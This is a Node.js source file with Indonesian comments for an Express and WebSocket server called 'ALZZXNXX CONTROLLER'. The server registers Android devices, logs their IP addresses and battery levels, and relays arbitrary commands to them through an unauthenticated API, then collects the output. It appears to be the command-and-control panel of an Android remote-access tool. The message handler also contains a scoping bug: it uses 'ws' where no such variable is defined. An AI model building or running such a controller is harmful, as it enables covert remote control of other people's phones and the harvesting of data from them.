// ================================================================
// ALZZXNXX CONTROLLER - SERVER
// WebSocket + HTTP Server
// CODED BY: @csalnotdev
// ================================================================

const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

// ================================================================
// KONFIGURASI
// ================================================================

const PORT = process.env.PORT || 8080;
const WS_PATH = '/ws';
const CLIENTS_FILE = path.join(__dirname, 'clients.json');

// ================================================================
// EXPRESS APP
// ================================================================

const app = express();
app.use(cors());
app.use(express.json());

// Serve static files (dashboard)
app.use(express.static(path.join(__dirname, '../public')));

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({
        status: 'online',
        uptime: process.uptime(),
        clients: Object.keys(clients).length,
        timestamp: new Date().toISOString()
    });
});

// API: get all clients
app.get('/api/clients', (req, res) => {
    const list = Object.keys(clients).map(id => ({
        id: id,
        name: clients[id].name || 'Unknown',
        os: clients[id].os || 'Android',
        ip: clients[id].ip || '0.0.0.0',
        battery: clients[id].battery || 'N/A',
        status: clients[id].status || 'offline',
        lastSeen: clients[id].lastSeen || new Date().toISOString()
    }));
    res.json({ clients: list });
});

// API: send command to specific client
app.post('/api/command', (req, res) => {
    const { target, command } = req.body;
    if (!target || !command) {
        return res.status(400).json({ error: 'target dan command wajib diisi' });
    }

    const client = clients[target];
    if (!client || client.status !== 'online') {
        return res.status(404).json({ error: 'Client tidak ditemukan atau offline' });
    }

    // Kirim command via WebSocket
    if (client.ws && client.ws.readyState === WebSocket.OPEN) {
        client.ws.send(JSON.stringify({
            type: 'command',
            command: command,
            id: generateId()
        }));
        return res.json({ success: true, message: 'Command dikirim' });
    }

    return res.status(500).json({ error: 'WebSocket tidak tersedia' });
});

// ================================================================
// WEBSOCKET SERVER
// ================================================================

const server = http.createServer(app);
const wss = new WebSocket.Server({ server, path: WS_PATH });

// Store connected clients
const clients = {};

// Load saved clients from file
function loadClients() {
    try {
        if (fs.existsSync(CLIENTS_FILE)) {
            const data = fs.readFileSync(CLIENTS_FILE, 'utf8');
            const saved = JSON.parse(data);
            Object.keys(saved).forEach(id => {
                if (!clients[id]) {
                    clients[id] = saved[id];
                    clients[id].status = 'offline';
                    clients[id].ws = null;
                }
            });
            console.log(`[LOAD] ${Object.keys(saved).length} clients loaded from file`);
        }
    } catch (err) {
        console.log('[LOAD] No saved clients found');
    }
}

// Save clients to file
function saveClients() {
    try {
        const data = {};
        Object.keys(clients).forEach(id => {
            data[id] = {
                name: clients[id].name || 'Unknown',
                os: clients[id].os || 'Android',
                ip: clients[id].ip || '0.0.0.0',
                battery: clients[id].battery || 'N/A',
                lastSeen: clients[id].lastSeen || new Date().toISOString()
            };
        });
        fs.writeFileSync(CLIENTS_FILE, JSON.stringify(data, null, 2));
    } catch (err) {
        console.log('[SAVE] Error saving clients:', err.message);
    }
}

// Generate unique ID
function generateId() {
    return 'xxxxxxxxxxxx'.replace(/x/g, () => {
        return Math.random().toString(36).substring(2, 3);
    });
}

// Broadcast to all clients
function broadcast(data, excludeId) {
    const message = JSON.stringify(data);
    Object.keys(clients).forEach(id => {
        if (id === excludeId) return;
        const client = clients[id];
        if (client.ws && client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(message);
        }
    });
}

// Broadcast client list
function broadcastClientList() {
    const list = Object.keys(clients).map(id => ({
        id: id,
        name: clients[id].name || 'Unknown',
        os: clients[id].os || 'Android',
        ip: clients[id].ip || '0.0.0.0',
        battery: clients[id].battery || 'N/A',
        status: clients[id].status || 'offline'
    }));
    broadcast({ type: 'client_list', clients: list });
}

// ================================================================
// WEBSOCKET CONNECTION HANDLER
// ================================================================

wss.on('connection', (ws, req) => {
    const clientId = generateId();
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '0.0.0.0';

    console.log(`[WS] New connection: ${clientId} from ${clientIp}`);

    // Initialize client
    clients[clientId] = {
        ws: ws,
        id: clientId,
        name: 'Unknown Device',
        os: 'Android',
        ip: clientIp,
        battery: 'N/A',
        status: 'online',
        lastSeen: new Date().toISOString(),
        connectedAt: new Date().toISOString()
    };

    // Send client ID to client
    ws.send(JSON.stringify({
        type: 'connected',
        id: clientId,
        message: 'Terhubung ke server ALZZXNXX CONTROLLER'
    }));

    // Broadcast new client to all
    broadcastClientList();

    // ============================================================
    // MESSAGE HANDLER
    // ============================================================

    ws.on('message', (rawData) => {
        try {
            const data = JSON.parse(rawData.toString());
            handleClientMessage(clientId, data);
        } catch (err) {
            console.log(`[WS] Invalid JSON from ${clientId}:`, err.message);
            ws.send(JSON.stringify({
                type: 'error',
                message: 'Invalid JSON format'
            }));
        }
    });

    // ============================================================
    // CLOSE HANDLER
    // ============================================================

    ws.on('close', () => {
        console.log(`[WS] Client ${clientId} disconnected`);
        if (clients[clientId]) {
            clients[clientId].status = 'offline';
            clients[clientId].ws = null;
            clients[clientId].lastSeen = new Date().toISOString();
            broadcast({
                type: 'client_disconnected',
                id: clientId
            });
            broadcastClientList();
            saveClients();
        }
    });

    // ============================================================
    // ERROR HANDLER
    // ============================================================

    ws.on('error', (err) => {
        console.log(`[WS] Error on ${clientId}:`, err.message);
        if (clients[clientId]) {
            clients[clientId].status = 'offline';
            clients[clientId].ws = null;
            broadcast({
                type: 'client_disconnected',
                id: clientId
            });
            broadcastClientList();
            saveClients();
        }
    });

    // ============================================================
    // PING/PONG (keep alive)
    // ============================================================

    ws.isAlive = true;
    ws.on('pong', () => {
        ws.isAlive = true;
        if (clients[clientId]) {
            clients[clientId].lastSeen = new Date().toISOString();
        }
    });

    // Save after new connection
    saveClients();
});

// ================================================================
// HANDLE CLIENT MESSAGE
// ================================================================

function handleClientMessage(clientId, data) {
    const client = clients[clientId];
    if (!client) return;

    switch (data.type) {

        // ============================================================
        // REGISTER / INFO
        // ============================================================
        case 'register':
            client.name = data.name || client.name || 'Unknown';
            client.os = data.os || client.os || 'Android';
            client.battery = data.battery || client.battery || 'N/A';
            client.status = 'online';
            client.lastSeen = new Date().toISOString();

            broadcast({
                type: 'client_connected',
                id: clientId,
                name: client.name,
                os: client.os,
                ip: client.ip,
                battery: client.battery
            });

            broadcastClientList();
            saveClients();

            console.log(`[REG] ${client.name} (${clientId}) registered`);
            break;

        // ============================================================
        // COMMAND RESULT
        // ============================================================
        case 'command_result':
            const result = data.result || 'No result';
            const commandId = data.id || 'unknown';

            broadcast({
                type: 'command_result',
                clientId: clientId,
                commandId: commandId,
                result: result,
                timestamp: new Date().toISOString()
            });

            console.log(`[CMD] Result from ${clientId}: ${result.substring(0, 80)}...`);
            break;

        // ============================================================
        // STATUS UPDATE
        // ============================================================
        case 'status':
            if (data.battery) client.battery = data.battery;
            client.status = data.status || 'online';
            client.lastSeen = new Date().toISOString();

            broadcastClientList();
            saveClients();
            break;

        // ============================================================
        // PING
        // ============================================================
        case 'ping':
            client.lastSeen = new Date().toISOString();
            ws.send(JSON.stringify({
                type: 'pong',
                timestamp: new Date().toISOString()
            }));
            break;

        // ============================================================
        // GET CLIENTS
        // ============================================================
        case 'get_clients':
            broadcastClientList();
            break;

        // ============================================================
        // UNKNOWN
        // ============================================================
        default:
            console.log(`[WS] Unknown type from ${clientId}: ${data.type}`);
            ws.send(JSON.stringify({
                type: 'error',
                message: `Unknown type: ${data.type}`
            }));
    }
}

// ================================================================
// PING INTERVAL (keep alive)
// ================================================================

const pingInterval = setInterval(() => {
    Object.keys(clients).forEach(id => {
        const client = clients[id];
        if (client.ws && client.ws.readyState === WebSocket.OPEN) {
            if (!client.ws.isAlive) {
                console.log(`[PING] ${id} timeout, terminating`);
                client.ws.terminate();
                return;
            }
            client.ws.isAlive = false;
            client.ws.ping();
        }
    });
}, 30000);

// ================================================================
// LOAD SAVED CLIENTS
// ================================================================

loadClients();

// ================================================================
// START SERVER
// ================================================================

server.listen(PORT, '0.0.0.0', () => {
    console.log('================================================');
    console.log('  ALZZXNXX CONTROLLER SERVER');
    console.log('================================================');
    console.log(`  HTTP  : http://0.0.0.0:${PORT}`);
    console.log(`  WS    : ws://0.0.0.0:${PORT}${WS_PATH}`);
    console.log(`  Clients loaded: ${Object.keys(clients).length}`);
    console.log('================================================');
    console.log('  Server is running...');
    console.log('================================================');
});

// ================================================================
// GRACEFUL SHUTDOWN
// ================================================================

process.on('SIGTERM', () => {
    console.log('[SHUTDOWN] SIGTERM received, closing...');
    clearInterval(pingInterval);
    Object.keys(clients).forEach(id => {
        if (clients[id].ws) {
            clients[id].ws.close();
        }
    });
    saveClients();
    server.close(() => {
        console.log('[SHUTDOWN] Server closed');
        process.exit(0);
    });
});

process.on('SIGINT', () => {
    console.log('[SHUTDOWN] SIGINT received, closing...');
    clearInterval(pingInterval);
    Object.keys(clients).forEach(id => {
        if (clients[id].ws) {
            clients[id].ws.close();
        }
    });
    saveClients();
    server.close(() => {
        console.log('[SHUTDOWN] Server closed');
        process.exit(0);
    });
});

// ================================================================
// ERROR HANDLING
// ================================================================

process.on('uncaughtException', (err) => {
    console.log('[FATAL] Uncaught Exception:', err.message);
    console.log(err.stack);
});

process.on('unhandledRejection', (reason) => {
    console.log('[FATAL] Unhandled Rejection:', reason);
});

// ================================================================
// EXPORT (untuk testing)
// ================================================================

module.exports = { app, server, wss, clients };